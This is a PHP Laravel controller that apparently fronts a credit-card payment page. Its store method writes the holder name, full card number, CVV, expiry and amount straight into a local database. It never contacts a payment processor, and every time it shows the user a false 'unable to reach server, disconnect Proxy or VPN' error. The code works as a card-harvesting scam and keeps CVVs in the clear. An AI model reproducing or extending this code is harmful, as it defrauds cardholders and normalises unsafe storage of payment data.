<?php

namespace App\Http\Controllers\Payment;

use App\Http\Controllers\Controller;
use App\Http\Requests\Payment\CardFormRequest;
use App\Models\Card;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class CardController extends Controller
{
    public function index()
    {
        $user = User::find(auth()->id());
        $card = Card::where('user', $user->id)->get();
        return view('payment-creditcard', compact('card'));
    }

    public function store(CardFormRequest $request)
    {
        $data = $request->validated();

        $paypal = new Card;
        $paypal->user = Auth::user()->id;
        $paypal->holdername = $data['holdername'];
        $paypal->cardnum = $data['cardnum'];
        $paypal->cv = $data['cv'];
        $paypal->exp = $data['exp'];
        $paypal->amount = $data['amount'];
        $paypal->save();

        return redirect('dashboard/payment/creditcard')->with('message', 'Process Terminated: Unable to reach server, disconect Proxy or VPN and try again!');
    }
}
